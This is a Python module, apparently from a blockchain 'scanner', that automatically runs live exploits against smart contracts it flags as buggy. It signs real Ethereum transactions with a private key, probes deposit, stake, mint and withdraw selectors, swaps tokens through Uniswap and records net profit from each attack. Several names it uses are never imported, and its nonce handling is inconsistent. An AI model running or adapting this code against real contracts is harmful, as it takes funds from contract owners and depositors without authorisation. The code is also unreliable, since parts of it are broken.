import logging
import time
from typing import Dict, Any, Optional, Tuple
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account
from scanner.config import (
    AUTO_EXPLOIT,
    PRIVATE_KEY,
    MY_WALLET_ADDRESS,
    MAX_BET_SIZE_WEI,
    MAX_FEE_PER_GAS,
    MAX_PRIORITY_FEE,
    RPC_HTTP,
    WETH_ADDRESS,
    UNISWAP_V3_ROUTER
)

from scanner.simulation import run_honeypot_simulation_eth, run_honeypot_simulation_token

logger = logging.getLogger(__name__)

# Safety cap for the "minimal deposit" requested by user
# 0.0001 ETH or configured max, whichever is smaller
SAFE_DEPOSIT_AMOUNT = min(int(0.0001 * 10**18), MAX_BET_SIZE_WEI)

def execute_cautious_exploit(
    w3: Web3, 
    contract_address: str, 
    bug_type: str, 
    details: Optional[Dict[str, Any]] = None
) -> None:
    """
    Execute a cautious live exploit:
    1. Minimal Deposit (SAFE_DEPOSIT_AMOUNT)
    2. Immediate Withdraw (All)
    
    Args:
        w3: Web3 instance
        contract_address: Target contract
        bug_type: Type of bug found
        details: Additional bug details
    """
    if not AUTO_EXPLOIT:
        logger.info("[EXPLOIT] Auto-exploit is disabled in config (AUTO_EXPLOIT=False).")
        return
    if not PRIVATE_KEY:
        logger.info("[EXPLOIT] No private key found in config. Cannot execute.")
        return

    try:
        account = Account.from_key(PRIVATE_KEY)
        my_address = account.address
        nonce = w3.eth.get_transaction_count(my_address)
        
        # --- PROFIT TRACKING START ---
        start_balance = w3.eth.get_balance(my_address)
        # -----------------------------

        print(f"[EXPLOIT] Preparing cautious exploit for {contract_address} ({bug_type})...", flush=True)
        
        last_tx_hash = None

        # 1. Determine Payload based on bug type
        # Default strategy: Deposit -> Withdraw
        
        # Common Selectors
        # deposit() -> d0e30db0
        # deposit(uint256) -> b6b55f25
        # withdraw() -> 3ccfd60b
        # withdraw(uint256) -> 2e1a7d4d
        # withdrawAll() -> 853828b6
        
        # We will try to construct a "multicall" if supported, or send two transactions.
        # Sending two transactions is risky (atomicity), but for "cautious live exploit" 
        # checking generic bugs, it might be the only way without a custom smart contract.
        
        # However, for Context Leak (multicall), we MUST use multicall in one tx.
        
        if bug_type == "context_leak_multicall":
            # Safety Check for Context Leak
            # We must simulate the specific multicall payload to be sure.
            # For now, to be absolutely safe, we skip unless we implement a specific simulation.
            # OR we can try the generic safety check as a weak proxy, but that's risky.
            # BETTER: Disable for now to protect funds until specialized simulation is ready.
            print(f"[EXPLOIT] Skipping Context Leak for {contract_address} to guarantee safety (Simulation pending).", flush=True)
            return
            # last_tx_hash = _exploit_context_leak(w3, account, contract_address, nonce)
            
        elif bug_type == "sync_loss":
            print(f"[EXPLOIT] Skipping Sync Loss for {contract_address} (Gas saving mode - usually yields dust/tokens, not ETH).", flush=True)
            return
            # last_tx_hash = _exploit_sync_loss(w3, account, contract_address, nonce)
            
        elif bug_type == "ghost_liquidity":
            print(f"[EXPLOIT] Skipping Ghost Liquidity for {contract_address} (Gas saving mode - speculative ownership claim).", flush=True)
            return
            # last_tx_hash = _exploit_ghost_liquidity(w3, account, contract_address, nonce, details)
            
        elif bug_type == "timestamp_dependence":
            # Just do deposit -> withdraw fast
            # If we succeed, it means timestamp check failed or wasn't strict enough
            last_tx_hash = _exploit_generic_deposit_withdraw(w3, account, contract_address, nonce)

        elif bug_type == "vault_rounding_dust":
            print(f"[EXPLOIT] Vault/Inflation vulnerability detected. Attempting generic Deposit->Withdraw to probe path.", flush=True)
            last_tx_hash = _exploit_generic_deposit_withdraw(w3, account, contract_address, nonce)

        elif bug_type == "fot_misaccounting_vault":
            # User requested NO passive reporting.
            # Since we can't exploit FoT without tokens/capital, just return silently.
            return

        else:
            # Generic Fallback: Deposit -> Withdraw
            last_tx_hash = _exploit_generic_deposit_withdraw(w3, account, contract_address, nonce)

        # --- PROFIT CALCULATION ---
        if last_tx_hash:
            print(f"[EXPLOIT] Waiting for confirmation of {last_tx_hash}...", flush=True)
            try:
                w3.eth.wait_for_transaction_receipt(last_tx_hash, timeout=60)
                end_balance = w3.eth.get_balance(my_address)
                profit = end_balance - start_balance
                print(f"[RESULT] Execution Finished. Net Profit: {profit} wei ({w3.from_wei(profit, 'ether')} ETH)", flush=True)
            except Exception as e:
                print(f"[RESULT] Could not fetch final balance/receipt: {e}", flush=True)
        # -----------------------------

    except Exception as e:
        logger.error(f"[EXPLOIT] Failed: {e}")
        print(f"[EXPLOIT] Failed: {e}", flush=True)


def _check_withdrawal_safety(w3: Web3, contract_address: str) -> Tuple[bool, Optional[str], int, Optional[str]]:
    """
    Run local simulation to verify we can withdraw.
    Returns: (is_safe, method_name, simulated_profit, token_address)
    """
    print(f"[SAFETY] Checking if {contract_address} is a Token Vault or ETH Vault...", flush=True)
    
    # 1. Detect Asset/Token
    token_address = None
    try:
        # Try 'asset()' (ERC4626)
        asset_call = w3.eth.call({"to": contract_address, "data": w3.keccak(text="asset()")[:4]})
        if len(asset_call) >= 32:
            token_address = w3.to_checksum_address(asset_call[-20:])
    except:
        pass
        
    if not token_address:
        try:
            # Try 'token()'
            token_call = w3.eth.call({"to": contract_address, "data": w3.keccak(text="token()")[:4]})
            if len(token_call) >= 32:
                token_address = w3.to_checksum_address(token_call[-20:])
        except:
            pass

    # 2. Run Appropriate Simulation
    if token_address:
        print(f"[SAFETY] Detected Token Vault. Asset: {token_address}. Running Full Cycle (Swap->Dep->With->Swap)...", flush=True)
        res = run_honeypot_simulation_token(contract_address, token_address, RPC_HTTP, WETH_ADDRESS, UNISWAP_V3_ROUTER)
    else:
        print(f"[SAFETY] Detected ETH Vault. Running Deposit->Withdraw...", flush=True)
        res = run_honeypot_simulation_eth(contract_address, RPC_HTTP)

    if res.get("safe"):
        method = res.get("method")
        profit = res.get("simulated_profit", 0)
        print(f"[SAFETY] Simulation PASSED. Method: {method}, Profit: {profit} wei", flush=True)
        return True, method, profit, token_address
    else:
        print(f"[SAFETY] Simulation FAILED. Error: {res.get('error')}", flush=True)
        return False, None, 0, None


def _get_quote(w3: Web3, token_in: str, token_out: str, fee: int, amount_in: int) -> int:
    """
    Get quote from Uniswap V3 Quoter.
    """
    # Interface: function quoteExactInputSingle(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn, uint160 sqrtPriceLimitX96) external returns (uint256 amountOut)
    # Selector: f7729d3f
    
    encoded = encode(
        ['address', 'address', 'uint24', 'uint256', 'uint160'],
        [token_in, token_out, fee, amount_in, 0]
    )
    data = bytes.fromhex("f7729d3f") + encoded
    
    try:
        result = w3.eth.call({
            "to": UNISWAP_V3_QUOTER,
            "data": data
        })
        amount_out = decode(['uint256'], result)[0]
        return amount_out
    except Exception as e:
        # Try checking if it's QuoterV2 (different selector?) or just no liquidity
        # QuoterV2 quoteExactInputSingleParams is a struct.
        # For now assume QuoterV1 or failure means no liquidity.
        print(f"[QUOTE] Failed to get quote (Fee {fee}): {e}", flush=True)
        return 0


def _swap_eth_to_token(w3: Web3, account, token_out: str, amount_eth: int, nonce: int) -> Optional[str]:
    """Swap ETH -> Token on Uniswap V3 (or compatible)"""
    print(f"[SWAP] Swapping {amount_eth} wei ETH -> {token_out}...", flush=True)
    
    # 1. Get Quote to set MinAmountOut (Slippage protection)
    # Try fees: 3000, 500, 10000
    fee = 3000
    amount_out_quoted = _get_quote(w3, WETH_ADDRESS, token_out, fee, amount_eth)
    
    if amount_out_quoted == 0:
        fee = 500
        amount_out_quoted = _get_quote(w3, WETH_ADDRESS, token_out, fee, amount_eth)
    
    if amount_out_quoted == 0:
        fee = 10000
        amount_out_quoted = _get_quote(w3, WETH_ADDRESS, token_out, fee, amount_eth)
        
    if amount_out_quoted == 0:
        print("[SWAP] No liquidity found for swap. Aborting.", flush=True)
        return nonce

    # Apply 0.5% Slippage
    amount_out_min = int(amount_out_quoted * 0.995)
    print(f"[SWAP] Quote: {amount_out_quoted} tokens. Min (0.5% slip): {amount_out_min}. Fee: {fee}", flush=True)

    # 2. Wrap ETH
    weth = w3.eth.contract(address=WETH_ADDRESS, abi=[
        {"constant":False,"inputs":[],"name":"deposit","outputs":[],"payable":True,"type":"function"},
        {"constant":False,"inputs":[{"name":"guy","type":"address"},{"name":"wad","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":False,"type":"function"}
    ])
    
    # Send wrap tx
    tx_wrap = weth.functions.deposit().build_transaction({
        'from': account.address,
        'value': amount_eth,
        'nonce': nonce,
        'gas': 50000,
        'maxFeePerGas': w3.eth.gas_price,
        'maxPriorityFeePerGas': MAX_PRIORITY_FEE
    })
    signed_wrap = w3.eth.account.sign_transaction(tx_wrap, PRIVATE_KEY)
    w3.eth.send_raw_transaction(signed_wrap.rawTransaction)
    nonce += 1
    
    # 3. Approve Router
    tx_app = weth.functions.approve(UNISWAP_V3_ROUTER, amount_eth).build_transaction({
        'from': account.address,
        'nonce': nonce,
        'gas': 50000,
        'maxFeePerGas': w3.eth.gas_price,
        'maxPriorityFeePerGas': MAX_PRIORITY_FEE
    })
    signed_app = w3.eth.account.sign_transaction(tx_app, PRIVATE_KEY)
    w3.eth.send_raw_transaction(signed_app.rawTransaction)
    nonce += 1

    # 4. Swap (ExactInputSingle)
    # params tuple: (tokenIn, tokenOut, fee, recipient, deadline, amountIn, amountOutMin, sqrtPriceLimitX96)
    params = (
        WETH_ADDRESS,
        token_out,
        fee,
        account.address,
        int(time.time()) + 60, # 60s deadline
        amount_eth,
        amount_out_min, # Slippage Enforced
        0
    )
    
    # exactInputSingle((address,address,uint24,address,uint256,uint256,uint256,uint160))
    encoded_params = encode(
        ['(address,address,uint24,address,uint256,uint256,uint256,uint160)'],
        [params]
    )
    
    data = bytes.fromhex("414bf389") + encoded_params
    
    tx_swap = {
        'from': account.address,
        'to': UNISWAP_V3_ROUTER,
        'value': 0,
        'data': data,
        'nonce': nonce,
        'gas': 200000,
        'maxFeePerGas': w3.eth.gas_price,
        'maxPriorityFeePerGas': MAX_PRIORITY_FEE
    }
    
    signed_swap = w3.eth.account.sign_transaction(tx_swap, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_swap.rawTransaction)
    
    # Wait for swap to complete
    w3.eth.wait_for_transaction_receipt(tx_hash)
    
    return nonce + 1 # Return new nonce


def _swap_token_to_eth(w3: Web3, account, token_in: str, nonce: int) -> Optional[str]:
    """Swap Token -> ETH (via WETH) on Uniswap V3"""
    # 1. Read balance
    token_contract = w3.eth.contract(address=token_in, abi=[{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"type":"function"}])
    balance = token_contract.functions.balanceOf(account.address).call()
    
    if balance == 0:
        print("[SWAP] No tokens to swap back.", flush=True)
        return nonce

    print(f"[SWAP] Swapping {balance} {token_in} -> ETH...", flush=True)

    # 2. Get Quote
    fee = 3000
    amount_out_quoted = _get_quote(w3, token_in, WETH_ADDRESS, fee, balance)
    
    if amount_out_quoted == 0:
        fee = 500
        amount_out_quoted = _get_quote(w3, token_in, WETH_ADDRESS, fee, balance)
        
    if amount_out_quoted == 0:
        fee = 10000
        amount_out_quoted = _get_quote(w3, token_in, WETH_ADDRESS, fee, balance)

    amount_out_min = int(amount_out_quoted * 0.995) if amount_out_quoted > 0 else 0
    print(f"[SWAP] Quote: {amount_out_quoted} ETH. Min: {amount_out_min}. Fee: {fee}", flush=True)

    # 3. Approve Router
    approve_sig = bytes.fromhex("095ea7b3")
    router_padded = UNISWAP_V3_ROUTER[2:].zfill(64)
    amount_padded = hex(balance)[2:].zfill(64)
    app_data = approve_sig + bytes.fromhex(router_padded) + bytes.fromhex(amount_padded)
    
    _send_tx(w3, account, token_in, 0, app_data, nonce)
    nonce += 1
    
    # 4. Swap Token -> WETH
    params = (
        token_in,
        WETH_ADDRESS,
        fee,
        account.address,
        int(time.time()) + 60,
        balance,
        amount_out_min, # Slippage Enforced
        0
    )
    encoded_params = encode(
        ['(address,address,uint24,address,uint256,uint256,uint256,uint160)'],
        [params]
    )
    data = bytes.fromhex("414bf389") + encoded_params
    
    tx_hash = _send_tx(w3, account, UNISWAP_V3_ROUTER, 0, data, nonce)
    if tx_hash:
        w3.eth.wait_for_transaction_receipt(tx_hash)
    nonce += 1
    
    # 5. Unwrap WETH -> ETH
    weth_contract = w3.eth.contract(address=WETH_ADDRESS, abi=[{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"type":"function"}])
    weth_bal = weth_contract.functions.balanceOf(account.address).call()
    
    if weth_bal > 0:
        unwrap_sig = bytes.fromhex("2e1a7d4d")
        amt_padded = hex(weth_bal)[2:].zfill(64)
        u_data = unwrap_sig + bytes.fromhex(amt_padded)
        tx_hash = _send_tx(w3, account, WETH_ADDRESS, 0, u_data, nonce)
        return tx_hash # Return last tx hash
        
    return None


def _exploit_generic_deposit_withdraw(w3: Web3, account, target: str, nonce: int) -> Optional[str]:
    """
    Generic Deposit (0.0001 ETH) -> Withdraw (Smart)
    """
    # SAFETY CHECK: Run local simulation first
    is_safe, withdraw_method, simulated_profit, token_address = _check_withdrawal_safety(w3, target)
    if not is_safe:
        print(f"[EXPLOIT] Safety check failed for {target}. Aborting to save funds.", flush=True)
        return None

    # GAS & PROFIT CHECK
    gas_price = w3.eth.gas_price
    # Estimate gas: Swap(200k) + Approve(50k) + Deposit(100k) + Withdraw(100k) + Swap(200k) + Unwrap(50k) = ~700k worst case
    estimated_gas = 700000 if token_address else 200000
    tx_cost = estimated_gas * gas_price
    
    print(f"[GAS] Current Base Fee: {gas_price} wei. Estimated Cost: {tx_cost} wei.", flush=True)
    
    if simulated_profit <= tx_cost:
        print(f"[SKIP] Gas too expensive. Profit: {simulated_profit} <= Cost: {tx_cost}. Net: {simulated_profit - tx_cost}", flush=True)
        return None
    
    print(f"[EXPLOIT] Profit found: {simulated_profit} wei. Proceeding...", flush=True)

    # TOKEN PATH
    if token_address:
        print(f"[EXPLOIT] Initiating Token Flow for {token_address}...", flush=True)
        # 1. Swap ETH -> Token
        nonce = _swap_eth_to_token(w3, account, token_address, SAFE_DEPOSIT_AMOUNT, nonce)
        
        # 2. Approve Target
        # Need token balance? assume swap gave us roughly SAFE_DEPOSIT_AMOUNT worth
        # Just approve a lot
        approve_sig = bytes.fromhex("095ea7b3")
        target_padded = target[2:].zfill(64)
        huge_amount = bytes.fromhex("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
        app_data = approve_sig + bytes.fromhex(target_padded) + huge_amount
        _send_tx(w3, account, token_address, 0, app_data, nonce)
        nonce += 1
        
        # 3. Deposit (Try selectors)
        # We need to know HOW much we have.
        token_contract = w3.eth.contract(address=token_address, abi=[{"constant":True,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":False,"type":"function"}])
        my_tokens = token_contract.functions.balanceOf(account.address).call()
        
        print(f"[EXPLOIT] Depositing {my_tokens} tokens...", flush=True)
        
        # Try deposit(uint256)
        dep_sig = bytes.fromhex("b6b55f25")
        amt_padded = hex(my_tokens)[2:].zfill(64)
        
        # Try primary method first?
        # Let's just try deposit(uint256) then deposit(uint256, address)
        tx_hash = _send_tx(w3, account, target, 0, dep_sig + bytes.fromhex(amt_padded), nonce)
        
        if not tx_hash:
             # Try deposit(uint256, address)
             dep_sig2 = bytes.fromhex("6e553f65")
             addr_padded = account.address[2:].zfill(64)
             tx_hash = _send_tx(w3, account, target, 0, dep_sig2 + bytes.fromhex(amt_padded) + bytes.fromhex(addr_padded), nonce)
             
        if not tx_hash:
             # Try mint(uint256) - a0712d68
             mint_sig = bytes.fromhex("a0712d68")
             tx_hash = _send_tx(w3, account, target, 0, mint_sig + bytes.fromhex(amt_padded), nonce)
             
        if not tx_hash:
             print("[EXPLOIT] Token deposit failed.", flush=True)
             return None
             
        nonce += 1
        
        # 4. Withdraw
        print(f"[EXPLOIT] Withdrawing...", flush=True)
        # Try withdraw(uint256)
        with_sig = bytes.fromhex("2e1a7d4d")
        tx_hash = _send_tx(w3, account, target, 0, with_sig + bytes.fromhex(amt_padded), nonce)
        nonce += 1
        
        # 5. Swap Token -> ETH
        last_tx = _swap_token_to_eth(w3, account, token_address, nonce)
        return last_tx

    # ETH PATH
    else:
        # Step 1: Deposit
        print(f"[EXPLOIT] Attempting Generic ETH Deposit {SAFE_DEPOSIT_AMOUNT} wei -> Withdraw...", flush=True)
        
        # 1. Deposit
        # Try 'deposit()' -> d0e30db0
        deposit_sig = bytes.fromhex("d0e30db0") 
        
        print(f"[EXPLOIT] Attempting specific 'deposit()' call...", flush=True)
        tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, deposit_sig, nonce)
        
        # Fallback: If deposit() failed, try Raw ETH Send (receive/fallback)
        if not tx_hash:
            print("[EXPLOIT] Standard 'deposit()' failed or reverted. Attempting Raw ETH send (fallback)...", flush=True)
            tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, b'', nonce)

        # Flexible Entry (New Selectors)
        if not tx_hash:
             # stake() -> 3a4b66f1
             print("[EXPLOIT] Trying stake()...", flush=True)
             tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, bytes.fromhex("3a4b66f1"), nonce)
             
        if not tx_hash:
             # contribute() -> c1cbb378
             print("[EXPLOIT] Trying contribute()...", flush=True)
             tx_hash = _send_tx(w3, account, target, SAFE_DEPOSIT_AMOUNT, bytes.fromhex("c1cbb378"), nonce)

        if not tx_hash:
            print("[EXPLOIT] All deposit methods failed. Aborting.", flush=True)
            return None

        # 2. Withdraw using the method confirmed by simulation
        print(f"[EXPLOIT] Deposit successful. Attempting withdraw using confirmed method: {withdraw_method}...", flush=True)
        
    data = b''
    
    if withdraw_method == "withdraw(uint256)":
        withdraw_sig = bytes.fromhex("2e1a7d4d")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        data = withdraw_sig + bytes.fromhex(amount_padded)
        
    elif withdraw_method == "withdraw()":
        data = bytes.fromhex("3ccfd60b")
        
    elif withdraw_method == "withdrawAll()":
        data = bytes.fromhex("853828b6")
        
    elif withdraw_method == "redeem(uint256)":
        # redeem(uint256 assets, address receiver, address owner)
        # Selector: ba087652
        selector = bytes.fromhex("ba087652")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        addr_padded = account.address[2:].zfill(64)
        data = selector + bytes.fromhex(amount_padded) + bytes.fromhex(addr_padded) + bytes.fromhex(addr_padded)
        
    else:
        # Default fallback
        print(f"[EXPLOIT] Unknown method '{withdraw_method}', defaulting to withdraw(uint256)", flush=True)
        withdraw_sig = bytes.fromhex("2e1a7d4d")
        amount_padded = hex(SAFE_DEPOSIT_AMOUNT)[2:].zfill(64)
        data = withdraw_sig + bytes.fromhex(amount_padded)
    
    return _send_tx(w3, account, target, 0, data, nonce + 1)


def _send_tx(w3: Web3, account, to: str, value: int, data: bytes, nonce: int) -> Optional[str]:
    """
    Helper to sign and send transaction with safety checks.
    """
    try:
        # 1. Estimate Gas (Simulation)
        gas_est = w3.eth.estimate_gas({
            "from": account.address,
            "to": to,
            "value": value,
            "data": data,
            "nonce": nonce
        })
        
        # Safety Multiplier
        gas_limit = int(gas_est * 1.2)
        
        tx = {
            "from": account.address,
            "to": to,
            "value": value,
            "data": data,
            "nonce": nonce,
            "gas": gas_limit,
            "maxFeePerGas": MAX_FEE_PER_GAS,
            "maxPriorityFeePerGas": MAX_PRIORITY_FEE,
            "chainId": w3.eth.chain_id,
            "type": 2
        }
        
        signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        print(f"[EXPLOIT] Sent TX: {to} | Val: {value} | Hash: {tx_hash.hex()}", flush=True)
        return tx_hash.hex()
        
    except Exception as e:
        print(f"[EXPLOIT] Simulation/Send failed for {to}: {e}", flush=True)
        return None
